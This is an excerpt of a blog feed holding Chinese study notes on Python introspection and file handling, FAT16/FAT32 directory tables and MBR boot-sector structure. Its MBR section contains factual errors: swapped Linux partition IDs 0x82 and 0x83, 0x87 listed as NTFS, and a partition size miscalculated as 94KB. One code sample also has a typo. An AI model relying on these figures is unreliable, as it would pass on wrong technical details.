        <content type="html"><![CDATA[<h2 id="dir-函数">dir 函数</h2><p>dir()函数不带参数时，返回<strong>当前范围内的变量、方法和定义的类型列表</strong>；带参数时，返回<strong>参数的属性、方法列表</strong>。如果参数包含方法<code>__dir__()</code>，该方法将被调用。如果参数不包含<code>__dir__()</code>，该方法将最大限度地收集参数信息。</p><p>用法： <code>dir([object])</code></p><p>内置模块直接传参进 dir() 即可，外部模块，如：time，requests等需要先导入（import），然后再进行对应步骤。</p><p>示例：</p><ol type="1"><li><p>内置模块直接调用 dir() 参数为类型名、空类型、类型实例等均可。查看 str 模块：<code>dir(str)， dir("")</code>查看字典模块：<code>dir(dict())、dir(&#123;&#125;)</code>查看集合模块：<code>dir(set())</code></p></li><li><p>外部模块先 import 导入， 然后再查看。 例如：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">dir</span>(time)</span><br></pre></td></tr></table></figure></p></li></ol><p><strong>常用来查看属性、方法列表</strong>，一般用在记不清（或者想查看）某些模块的属性或者方法存在与否时。</p><p>但是这个列表只有简略的名字，没有参数用法等详细介绍，需要用后面的<code>help</code> 函数或者 <code>__doc__</code> 属性查看使用帮助。</p><h2 id="help-函数">help 函数</h2><p>查看详细的模块介绍、类、方法的使用等。</p><ol type="1"><li><p>导入包（如果不是内置模块的话）</p></li><li><p>通过 help 命令查看函数（注意：要从模块写起）查看模块信息：<code>help(module_name)</code>查看模块下特定函数信息：<code>help(module_name.func_name)</code></p></li><li><p>如果只在 python console 里面输入 <code>help()</code>,进入帮助文档的交互模式(<code>ctrl+c</code> 退出)。</p></li></ol><p>例如：</p><p>查看 requests 的 session 方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: <span class="keyword">import</span> requests</span><br><span class="line">In [<span class="number">18</span>]: <span class="built_in">help</span>(requests.session)</span><br><span class="line">In [<span class="number">20</span>]: <span class="built_in">help</span>(requests.sessions.Session)</span><br></pre></td></tr></table></figure><p>查看 subproccess 的 run 方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">21</span>]: <span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: <span class="built_in">help</span>(subprocess.run)</span><br></pre></td></tr></table></figure><p>查看 str 的 count 函数使用：<code>help(str.count)</code></p><h2 id="doc__-属性"><code>__doc__</code> 属性</h2><p>我猜 <code>help()</code>应该就是从该属性提取的文档那个，二者内容差别不大，所以用<code>help()</code> 就够了</p><p>使用示例： <code>str.count.__doc__</code></p><p>此外，还有个 pydoc 官方工具和以上工具基本无差，不学了，哈哈。</p><h2 id="参考资料">参考资料</h2><p><a href="https://www.runoob.com/python/python-func-dir.html">Pythondir() 函数</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python with 语句操作文件(转)</title>
      <link href="/blog/2020/06/22/programming/python/2.object-oriented/file_with/"/>
      <url>/blog/2020/06/22/programming/python/2.object-oriented/file_with/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">introduction</h2><p>在磁盘上读写文件的功能都是由操作系统提供的，现代操作系统不允许普通的程序直接操作磁盘，所以，读写文件就是请求操作系统打开一个文件对象（通常称为文件描述符），然后，通过操作系统提供的接口从这个文件对象中读取数据（读文件），或者把数据写入这个文件对象（写文件）。</p><p>Python 提供了 with 语句来管理资源关闭。比如可以把打开的文件放在 with语句中，这样 with 语句就会帮我们自动关闭文件。</p><h2 id="读文件">读文件</h2><p>要以读文件的模式打开一个文件对象，使用 Python 内置的<code>open()</code> 函数，传入文件名和标示符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure><p>标示符 'r' 表示读，这样我们就成功地打开了一个文件。</p><p>如果文件不存在，<code>open()</code>函数就会抛出一个<code>IOError</code>的错误，并且给出错误码和详细的信息告诉你文件不存在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f=<span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/notfound.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt; FileNotFoundError: [Errno <span class="number">2</span>] No such file <span class="keyword">or</span> directory: <span class="string">&#x27;/Users/michael/notfound.txt&#x27;</span></span><br></pre></td></tr></table></figure><p>如果文件打开成功，接下来，调用 <code>read()</code>方法可以一次读取文件的全部内容，Python把内容读到内存，<strong>用一个<code>str</code>对象表示</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br><span class="line"><span class="string">&#x27;Hello, world!&#x27;</span></span><br></pre></td></tr></table></figure><p>最后一步是调用 <code>close()</code>方法关闭文件。文件使用完毕后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure><p>由于文件读写时都有可能产生 <code>IOError</code>，一旦出错，后面的<code>f.close()</code>就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<code>try ... finally</code>来实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>但是每次都这么写实在太繁琐，所以，Python引入了<code>with</code>语句来自动帮我们调用 <code>close()</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br></pre></td></tr></table></figure><p>这和前面的 <code>try ... finally</code>是一样的，但是代码更佳简洁，并且不必调用 <code>f.close()</code>方法。</p><p>调用 <code>read()</code> 会一次性读取文件的全部内容，如果文件有10G，内存就爆了，所以，要保险起见，可以反复调用 <code>read(size)</code>方法，每次最多读取 size 个字节的内容。另外，调用 <code>readline()</code>可以每次读取一行内容，调用 <code>readlines()</code>一次读取所有内容并按行返回<code>list</code>。因此，要根据需要决定怎么调用。</p><p>如果文件很小，<code>read()</code>一次性读取最方便；如果不能确定文件大小，反复调用<code>read(size)</code>比较保险；如果是配置文件，调用<code>readlines()</code>最方便：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    sprint(line.strip()) <span class="comment"># 把末尾的&#x27;\n&#x27;删掉</span></span><br></pre></td></tr></table></figure><h3 id="写文件">写文件</h3><p>写文件和读文件是一样的，唯一区别是调用 <code>open()</code>函数时，传入标识符 <code>w</code> 或者 <code>wb</code>表示写文本文件或写二进制文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure><p>你可以反复调用<code>write()</code>来写入文件，但是务必要调用<code>f.close()</code>来关闭文件。当我们写文件时，操作系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，空闲的时候再慢慢写入。只有调用<code>close()</code>方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用<code>close()</code>的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用<code>with</code>语句来得保险：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;/Users/michael/test.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">    f.write(&#x27;Hello, world!&#x27;)</span><br></pre></td></tr></table></figure><p>要写入特定编码的文本文件，请给<code>open()</code>函数传入<code>encoding</code>参数，将字符串自动转换成指定编码</p><h3 id="字符编码">字符编码</h3><p>要读取非 UTF-8 编码的文本文件，需要给 <code>open()</code>函数传入<code>encoding</code>参数，例如，读取 GBK 编码的文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>) &gt;&gt;&gt; f.read() <span class="string">&#x27;测试&#x27;</span></span><br></pre></td></tr></table></figure><p>遇到有些编码不规范的文件，你可能会遇到<code>UnicodeDecodeError</code>，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，<code>open()</code>函数还接收一个<code>errors</code>参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在 Windows 下打开文件时，容易遇到这种错误：“UnicodeEncodeError: 'gbk'codec can't encode character '' in position 46:illegal multibytesequence”，此时，只需要设置 open 的参数: encoding='utf-8' 即可。</p><h3 id="二进制文件">二进制文件</h3><p>前面讲的默认都是读取文本文件，并且是 UTF-8编码的文本文件。要读取二进制文件，比如图片、视频等等，用<code>'rb'</code>模式打开文件即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/test.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) &gt;&gt;&gt; f.read()</span><br><span class="line"><span class="string">b&#x27;\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...&#x27;</span> <span class="comment"># 十六进制表示的字节</span></span><br></pre></td></tr></table></figure><p>总结：以后读写文件都使用 with open 语句，不要再像以前那样用 f =open()这种语句了 with 语句的语法格式如下：</p><p>with context expression [as target(s)]: with 代码块</p><h2 id="参考资料">参考资料</h2><p><ahref="https://www.cnblogs.com/cwp-bg/p/7835434.html">UnicodeEncodeError:'gbk' codec can't encode character '' in position 46:illegal multibytesequence</a></p><p><a href="https://www.cnblogs.com/ymjyqsx/p/6554817.html">python文件读写,以后就用 with open 语句</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FDT 文件目录表</title>
      <link href="/blog/2020/04/25/os/3.fdt/"/>
      <url>/blog/2020/04/25/os/3.fdt/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>Format 格式化时，已对磁盘建立了一个根目录 FDT(File DirectoryTable)。</p><ul><li>在根目录下用户可以创建不同子目录或文件根目录下的所有文件及其子目录有一个目录登记项。The directory entry ofdirectory indicated the root directory address and its length is 0 byte.The directory entry of files indicates the data address.</li><li>根目录以及各个子目录都有自己的 FDT(文件目录表)。</li><li>DOS 中用“[盘符：] ”表示根目录</li><li>注意: 我们讨论的默认是 x86， 采用小端模式，高字节高地址存储。</li></ul><p>由于 FAT16 与 FAT32 有些区别，所以下面我们分开讲述。</p><h2 id="fat16s-fdt">FAT16's FDT</h2><p>在 FAT16 分区格式中，FDT 表的长度是固定的，为 32 个扇区</p><ul><li>每个目录登记项 32 个字节，分 8 个区域，提供文件目录信息。</li><li>最多保存 512 个文件或子目录。</li><li><code>扇区个数（32）*每个扇区大小（512）=每个目录项大小（32 字节）*目录项最大个数（512）</code></li></ul><h3 id="layout">Layout</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587783489268.png"alt="FAT16&#39;s FDT" /><figcaption aria-hidden="true">FAT16's FDT</figcaption></figure><p>下面介绍一些此格式中重要的部分:</p><ol type="1"><li><p>文件状态: 0 字节偏移 第一字节(0 号字节)，表示当前文件的状态。 |值 | 含义 | | ------- | ---------------------- | | 00H |目录项空表项（未使用） | | E5H | 曾使用过，但已删除 | | 2EH | "."当前目录 | | 2EH 2EH | ".." 上一级目录 |</p></li><li><p>属性字节: 11 字节偏移</p><ol type="1"><li><p>属性字节中是比特位对应属性 多种比特位的值表示其有多种属性，例如:系统隐含常常和文件或目录一起存在。 示例:</p><ol type="1"><li>系统隐含文件: 0010 0110H = 26</li><li>系统隐含子目录: 0001 0110H = 16 常见属性字节与值: | 值 | 类型 | |--- | -------------- | | 20 | 档案(文件) | | 10 | 子目录 | | 08 | 卷标 || 16 | 系统隐含子目录 | | 26 | 系统隐含文件 |</li></ol></li><li><p>卷标</p><ul><li>是一个磁盘的一个标识，不唯一。由格式化自动生成或人为设定。仅仅是一个区别于其他磁盘的标识而已。</li><li>卷标也占用一个目录登记项</li><li>可以看出卷标，子目录和文件用的是不同比特位，所以计算文件个数的时候不要算卷标，子目录哦</li></ul></li><li><p>子目录</p><ul><li>DOS采用层次目录，树型目录结构。子目录和文件一样都有目录登记项，子目录的目录名和文件名表示方式基本一样，目录登记项中：日期、时间、起始簇表示方式一样,只有属性和长度表示不同，长度固定为 0。</li><li>根目录由 DBR确定，而子目录由根目录下的目录登记项确定，如果我们要分析子目录下的东西，需要去子目录的FDT 去看。</li><li>系统通过 <code>.</code> 和 <code>..</code>实现目录间的双向联系，使目录能在目录之间进行切换</li><li>子目录比根目录多两个目录项，即 <code>.</code> 和 <code>..</code>,<code>.</code> 表示当前子目录， <code>..</code> 表示当前子目录的父目录<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587785628621.png"alt="sub-directory" /></li></ul></li><li><p>文件首簇号</p></li><li><p>文件长度</p></li></ol></li></ol><h3 id="剩余扇区数计算">剩余扇区数计算</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587797970353.png"alt="FAT16" /><figcaption aria-hidden="true">FAT16</figcaption></figure><p>系统在分区时会以柱面为分隔面，将同一柱面的扇区划分在一个分区内。划分5 个区域的过程，容易出现 <strong>DATA扇区不是一个整数，即有少于一个簇的扇区</strong></p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587798404564.png"alt="FAT16 DBR" /> 根据 DBR 知道，每簇 32 个扇区， 保留扇区 4个，扇区总数 1060227，此外，FDT 大小为 32 个扇区。</p><p>DATA 区的扇区数（包含剩余扇区） = 1060227–4–130x2–32 = 1059931</p><p>DATA 区的簇数（包含剩余扇区） = 1059931 / 32 = 33122.84375 约等于33122</p><p>那么，剩余扇区数 = 1059931-33122×32 = 0.84375 x 32 = 27即剩余扇区数为 27</p><h2 id="fat32s-directory">FAT32's Directory</h2><p>FAT32 中目录不再单独占有一块区域，可认为是数据区的一部分，其大小可变，不再像 FAT16一样固定扇区了。此外，根目录改成了根目录文件。</p><ul><li>根目录文件数据不受 512 个限制</li><li>根目录初始定为 1 个簇的大小，若空间不够，FAT 为根目录追加新的簇</li><li>原则上 FAT32 允许根目录位于数据区中的任何位置，通常位于 2号簇。</li><li>所有簇从 2 号开始依次编号。2号簇不是位于文件系统开始处，而是位于数据区，寻找 2号簇方法比较繁琐。</li><li>数据区以前的区域不能使用 FAT 表管理，因此只能使用扇区地址</li><li>FAT32 目录区的文件目录项包括:<ol type="1"><li>文件目录项</li><li>子目录项</li><li>卷标项（仅根目录有）</li><li>已删除目录项</li></ol></li></ul><p>FAT32 的目录登记项通过利用 FAT16的目录登记项中的保留未用部分，实现了扩容。具体见下图:</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587788386866.png"alt="FAT32 directory entry" /><figcaption aria-hidden="true">FAT32 directory entry</figcaption></figure><p>图中我用绿色深线框选的便是原来在 FAT16 中的保留未用部分。 注意: FAT32的目录登记项中簇号由两部分组成: 起始簇号的高 16 位和起始簇号的低 16位</p><h3 id="长文件名">长文件名</h3><p>FAT32 支持长文件名。</p><p>长文件名的实现:</p><ul><li>除一些磁盘工具外，多数程序通过操作系统获取文件名和目录名</li><li>若设置文件属性为 0FH，DOS 和 Windows 3.x 会忽略该目录项</li><li>解决长文件名与 DOS，Win 3.x 兼容性问题</li></ul><p>Windows95系统中，文件或目录设计存储两个名字，即短文件名和长文件名。其中长文件名对应的短文件名处理原则:</p><ol type="1"><li>取长文件名前 6 个字符加“~1”，扩展名不限</li><li>若已存在该名字，则“~”后的数字自动增加</li><li>若有 DOS，Win 3.x 非法字符，用 “_” 替代</li></ol><p>这就意味着如果一个文件或者目录的名字过长，他们的目录登记项就至少有4*16 = 64 字节的长度，其中，短文件名部分格式与之前介绍的一致。</p><p>长文件名部分,我们需要关注的有以下几部分: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587789961614.png"alt="long file name part" /></p><ol start="0" type="1"><li>长文件名部分也是以 32 个字节为一个内部小单位，进行标识。</li><li>0 号字节（第一个字节） 1 号比特(从 0 开始)为 1表示这是长文件的最后一个登记项（也就是这个长文件名目录登记项到此结束）3-7 号比特，表示这是长文件名目录部分的第几部分，也就是顺序号。</li><li>11 号字节（第 12 个字节） 属性字节为 "0F" 表示该项为长文件名</li><li>31 号字节(第 14 个字节)同一文件标号，该字节相同表示这是同一个文件的长文件名部分。</li></ol><p>下面我们详细地分析一个长文件名: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587790842536.png"alt="a long file name directory entry" /></p><p>重要部分已标识，下面一一分析。</p><ol type="1"><li><p>最左侧一列。</p><p>我们可以看到结束处为: 43H = 0100 0011B, 即: 1 号比特的 "1"标识长文件名结束，后面五个字节为长文件名目录登记项的长文件名部分的顺序号，从1 开始。我们从下向上看，可以看到 1 2 3 说明长文件名部分有 3个，也就是该长文件名目录登记项大小<code>3*32 + 32 = 128 字节</code></p></li><li><p>“0F” 作为长文件名部分的标识符。</p></li><li><p>“08” 同一个文件的标识符</p><p>也就是说 32个字节小单位的对应位置上的字节相同，说明它们是同一个长文件名部分。</p></li><li><p>短文件名部分</p><p>再强调一下：起始簇号是位于两个部分，要连起来即可。</p></li><li><p>长文件名目录登记项的识别?</p><p>它区别于普通的 FAT32 短文件名目录登记项的特征有以下三点：</p><ol type="1"><li>每 32 个字节的第一个字节的 3-7 位的值，即:顺序号</li><li>"0F" 长文件名部分的标志</li><li>同一文件标识符，一行的倒数第三个字节</li><li>winhex 右侧栏字符中的波浪线</li></ol></li><li><p>根据右侧字符栏看文件名</p><p>由于格式中一些字节的影响，太过复杂的长文件名看右侧字符栏应该读不太准。不过，想来，考试或平时只需要看些简单的或者简单了解一下名字而已。</p><p>以上图的长文件名为例子：短文件名部分，只有第一行读取短文件名，这里是: 007286~1GIF长文件名部分(完整的文件名)，每两行(32 个字节)为一个单位。读法:单元间由下到上，单元内从上到下，从左往右。 这里是: 007286Telylgc8j3iqlxmg307s 0d54qw.gif 读取长文件名时，要注意长文件结束字节(这里为 43)的字符影响，一般该行第一个字符去掉。</p></li></ol><p>长文件名实现注意事项:</p><ul><li>长文件名占用较多的目录登记项，目录登记项数据一般为 512 个</li><li>在根目录下最多能存储 46 个这样的长文件或目录</li><li>使用 16 位应用程序时，更改文件名，对应的长文件名将丢失</li><li>长文件名更名或删除时，长文件名将丢失，长文件名依附的短文件名存在</li><li>频繁创建和删除长文件名，会造成大量磁盘碎片 避免方式<ol type="1"><li>不在根目录下创建长文件名</li><li>磁盘碎片整理程序回收丢失的目录登记项</li></ol></li></ul><p>未完待续..</p><ul class="task-list"><li><label><input type="checkbox" />文件建立</label></li><li><label><input type="checkbox" />文件删除</label></li><li><label><input type="checkbox" />取证分析-数据隐藏</label></li></ul><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="http://www.data-recovery-app.com/datarecovery/fdt.html">datarecovery FDT</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Computer </tag>
            
            <tag> FDT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Boot Sector</title>
      <link href="/blog/2020/04/24/os/0.boot_sector/"/>
      <url>/blog/2020/04/24/os/0.boot_sector/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><blockquote><p>A boot sector is the sector of a persistent data storage device (e.g.hard disk, floppy disk, optical disc, etc.) which contains machine codeto be loaded into random-access memory (RAM) and then executed by acomputer system's built-in firmware -- Wikipedia</p></blockquote><h2 id="mbr-简介">MBR 简介</h2><p>引导扇区（Boot Sector），又称之为引导块（BootBlock)是硬盘、软盘或其它数据存储设备上的一个包含引导代码的区域，这些代码可以由计算机系统的内置固件(firmware)加载到内存中直接运行。主要有两种类型：MBR和 PBR（VBR）。</p><p>主引导记录(MBR, Master Boot Record)：</p><blockquote><p>The Master Boot Record (MBR) is the information in the first sectorof any hard disk or diskette that identifies how and where an operatingsystem is located so that it can be boot (loaded) into the computer'smain storage or random access memory.</p></blockquote><p>主引导记录 MBR 是存储在主引导扇区 MBS里面的数据内容，因此常常将二者混为一谈，慢慢地主引导扇区 MBS的概念就有些淡化了，就干脆叫做 MBR 扇区了。同理，PBR 与 PBS的关系也类似。</p><p>所以你现在往往可以看到这样的 MBR 解释：</p><blockquote><p>A master boot record (MBR) is a special type of boot sector at thevery beginning of partitioned computer mass storage devices like fixeddisks or removable drives intended for use with IBM PC-compatiblesystems and beyond. -- Wikipedia</p></blockquote><p>对于传统的 PC 机硬盘而言，每个硬盘的 0 柱面 0 磁头 1 扇区都有一个Master Boot Sector (MBS 主引导扇区), 也就是该硬盘的 MBR所在的位置。硬盘的每个<strong>分区</strong>的第一个扇区则是该分区的分区引导扇区（PartitionBoot Sector)，也就是该分区 PBR（Partition Boot Record) 所在的位置。MBR占用 512个字节，它用于硬盘启动时将系统控制权转给用户指定的、在分区表中登记了某个操作系统的分区的引导扇区。</p><blockquote><p>注：盘面号又称磁头号，每个盘面对应一个磁头。</p></blockquote><h3 id="mbr-特点">MBR 特点</h3><ul><li>MBR 的内容是在硬盘分区时由分区软件（如 FDISK）写入该扇区的</li><li>MBR 不属于任何一个操作系统，不随操作系统的不同而不同，即使不同，MBR也不会夹带操作系统的性质，具有公共引导的特性，但安装某些多重引导功能的软件或LINUX 的 LILO 时有可能改写它</li><li>MBR先于所有的操作系统被调入内存并发挥作用，然后才将控制权交给活动主分区内的操作系统。</li><li>该扇区为隐藏扇区，实际上，0 磁头 0柱面的扇区均为隐藏扇区，一般的硬盘访问命令无法访问，因此 MBR分区表放在此处比较安全，不容易遭到破坏，同理，许多病毒也伺机隐藏在这里，不容易被查杀。</li><li>对于 PC机以及兼容架构的系统而言，主引导记录只有存储在可引导设备的引导扇区里才能引导系统。这是这种系统架构的设计所规定的工作方式。</li></ul><h3 id="mbr-layout">MBR Layout</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200417092542.png"alt="Structure of a classical generic MBR from Wikipedia" /><figcaption aria-hidden="true">Structure of a classical generic MBR fromWikipedia</figcaption></figure><p>中文版: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204181587193302268.png"alt="标准 MBR 结构" /></p><p>MBR 512 字节，主要由三部分构成:</p><ol type="1"><li><p>引导程序代码(Bootstrap code)，最大占 446 字节</p><p>最后 6 个字节为 四个字节的 Windows disk signature 和保留待用的两字节0x0000</p></li><li><p>硬盘分区表 DPT(Disk Partition table for primary partitions)，占64 字节</p><p>硬盘分区有很多用处。考虑到每个区可以安装不同的操作系统，因此主引导记录必须知道将控制权转交给哪个区。分区表的长度只有 64 个字节，里面又<strong>分成四项，每项 16个字节</strong>。所以，一个硬盘最多只能分四个一级分区，又叫做"主分区"。</p><p>每个主分区的 16 个字节，由 6个部分组成，详细组成在下面有写到。</p></li><li><p>主引导扇区结束标志(Boot signature)</p><p>也有称之为 BRID(boot record ID，引导记录标识) 的。 0xAA55是判别引导区是否有效合法的标志。“55AA” 标志通知系统：该 MBR扇区是否有效，如果该标志丢失或损坏，磁盘将会显示为未初始化。</p><p>BRID 的主要作用就是判断该设备是否可以用于启动。BIOS按照“启动顺序”，把控制权转交给排在第一位的储存设备。这时，计算机读取该设备的第一个扇区，也就是读取最前面的512 个字节。如果这 512 个字节的最后两个字节是 0x55 和0xAA，表明这个设备可以用于启动；如果不是，表明设备不能用于启动，控制权于是被转交给“启动顺序”中的下一个设备。其实主引导记录的主要作用就是告诉计算机到硬盘的哪一个位置去找操作系统。</p></li></ol><p>winhex 定位到 MBR 的图(辅助理解):</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200418153411.png"alt="MBR hex" /><figcaption aria-hidden="true">MBR hex</figcaption></figure><h3 id="人工快速划分-mbr">人工快速划分 MBR</h3><p>拿到一个 winhex 展示的 MBR 时，如何人工快速划分其结构？</p><ol type="1"><li><p>确定 55AA 标志</p></li><li><p>向上数四行，划分出 DPT，磁盘分区表。 数四行是因为 winhex等都是一行从 0x0-0xF， 16 个字节， 4 行正好是 64 字节， 即: DPT的大小</p></li><li><p>完成 1，2 步后，再向上全部都是引导代码了。其中，向上两个字节，一般为空值， 0x0000 再向上四个字节，在本图中为 "7C95 5A 1F"，即：windows 磁盘签名</p></li><li><p>接下来我们就要专注于磁盘分区表了</p><p>磁盘分区表 DPT(64 字节) | 字节 | 长度 | 定义 | | :---------: | :---:|:-------------------------------------------------------------------------------------:| | 第 1 个字节 | 1 | <strong>0x00 表示非活动分区，0x80表示活动分区，四个分区最多有一个激活分区</strong> | | 第 2~4 字节 | 3 |该分区第一个扇区的物理位置 | | 第 5 个字节 | 1 |<strong>分区类型</strong> | | 第 6~8 字节 | 3 |该分区最后一个扇区的物理位置 | | 第 9-12 字节 | 4 |该分区第一个扇区的逻辑地址（也叫本分区之前的扇区数，Sector precedingPartition x(分区序号)） | | 第 13-16 字节 | 4 |<strong>该分区的扇区总数</strong> |</p><p>根据硬盘分区表的格式，分析如下分区表的第一个分区： <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200418172123.png"alt="20200418172123" /></p><p>首先我们可以看到，</p><p>第一个字节：0x00 代表非活动分区 第五个字节：分区类型 0x0C， 查<ahref="https://en.wikipedia.org/wiki/Partition_type">分区标识对照表</a>可得其为:FAT32</p><p>常见分区类型表(如果查不到，不代表没有，详细全面的类型表请看上一行的wiki 链接)： | Partition ID | type | | ------------ |---------------------- | | 0x00 | <strong>空，不允许使用</strong> | |0x04 | <strong>FAT16 格式（&lt;32M）</strong> | | 0x05 |<strong>扩展分区</strong> | | 0x06 | <strong>FAT16</strong> | | 0x0E |<strong>Win95 FAT16</strong> | | 0x0C | <strong>Win95 FAT32</strong> ||0x0B| <strong>FAT32 with CHS addressing</strong>| | 0x82 |<strong>Linux Native 分区</strong> | | 0x83 | <strong>Linux Swap分区</strong> | | 0x87 | <strong>NTFS</strong> | | 0xA6 | Open BSD | |0xA5 | FreeBSD |</p><p><strong>计算该分区的字节数</strong>： 本分区总扇区数: 根据第 13-16字节，得知为 0x00017800(‭96256‬)，又因为每个扇区是 512 字节因此，该分区的大小：<code>(96256‬*512)/(2^10)=94KB</code></p><p>最后的四个字节(第 13-16 字节)是主分区的扇区总数，决定了这个主分区的长度。也就是说，一个主分区的扇区总数最多不超过2 的 32 次方。，如果每个扇区为 512 个字节，就意味着单个分区最大不超过2TB。再考虑到扇区的逻辑地址也是 32位，所以单个硬盘可利用的空间最大也不超过 2TB。如果想使用更大的硬盘，只有2个方法：一是提高每个扇区的字节数，二是增加扇区总数。为了解决这些问题，人们发明了GPT 分区。</p></li></ol><p>至此，对 MBR 的分析基本结束。</p><h2 